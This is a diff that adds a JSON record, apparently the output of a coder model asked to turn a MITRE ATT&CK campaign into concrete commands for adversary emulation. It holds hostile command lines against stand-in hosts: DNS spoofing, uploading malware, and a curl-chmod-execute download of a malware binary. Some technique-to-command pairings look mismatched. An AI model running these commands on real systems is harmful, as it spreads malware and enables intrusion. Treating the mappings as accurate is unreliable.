@@ -1,0 +1,97 @@
+{
+  "campaign_id": "C0010",
+  "model": "qwen2.5-coder:14b",
+  "sample": 3,
+  "temperature": 0.7,
+  "realizations": [
+    {
+      "technique_id": "T1583.001",
+      "mechanism": "dns-spoofing",
+      "command": "dnsspoof -i eth0 -f spoof.list",
+      "target": "network.private_interface",
+      "parameters": {
+        "interface": "eth0",
+        "spoof_list": "spoof.list"
+      }
+    },
+    {
+      "technique_id": "T1584.001",
+      "mechanism": "register-domain",
+      "command": "python3 register_domain.py example.com",
+      "target": "runtime.python3",
+      "parameters": {
+        "domain_name": "example.com"
+      }
+    },
+    {
+      "technique_id": "T1587.001",
+      "mechanism": "malware-compilation",
+      "command": "gcc -o sugarush sugarush.c",
+      "target": "runtime.python3",
+      "parameters": {
+        "source_file": "sugarush.c",
+        "output_file": "sugarush"
+      }
+    },
+    {
+      "technique_id": "T1588.002",
+      "mechanism": "download-tool",
+      "command": "curl -o unicorn http://example.com/unicorn",
+      "target": "endpoint.public_service",
+      "parameters": {
+        "url": "http://example.com/unicorn"
+      }
+    },
+    {
+      "technique_id": "T1608.001",
+      "mechanism": "upload-malware",
+      "command": "python3 upload_file.py sugarush http://malware.example.com/",
+      "target": "runtime.python3",
+      "parameters": {
+        "file_path": "sugarush",
+        "upload_url": "http://malware.example.com/"
+      }
+    },
+    {
+      "technique_id": "T1608.002",
+      "mechanism": "upload-tool",
+      "command": "python3 upload_file.py unicorn http://tools.example.com/",
+      "target": "runtime.python3",
+      "parameters": {
+        "file_path": "unicorn",
+        "upload_url": "http://tools.example.com/"
+      }
+    },
+    {
+      "technique_id": "T1608.004",
+      "mechanism": "modify-website",
+      "command": "python3 modify_website.py http://example.com/login.html",
+      "target": "endpoint.public_service",
+      "parameters": {
+        "url": "http://example.com/login.html"
+      }
+    },
+    {
+      "technique_id": "T1189",
+      "mechanism": "exploit-login-page",
+      "command": "python3 exploit_login_page.py http://example.com/login.html",
+      "target": "endpoint.public_service",
+      "parameters": {
+        "url": "http://example.com/login.html"
+      }
+    },
+    {
+      "technique_id": "T1105",
+      "mechanism": "download-and-execute",
+      "command": "curl -o malware http://malware.example.com/malware && chmod +x malware && ./malware",
+      "target": "target.primary",
+      "parameters": {
+        "url": "http://malware.example.com/malware"
+      }
+    }
+  ],
+  "raw_proposal_keys": [
+    "realizations"
+  ],
+  "response_sha256": "f4ae43cf06394246674556e228cb0cc2d89ea7a4a7b5bab38aee0f5f621a2579"
+}
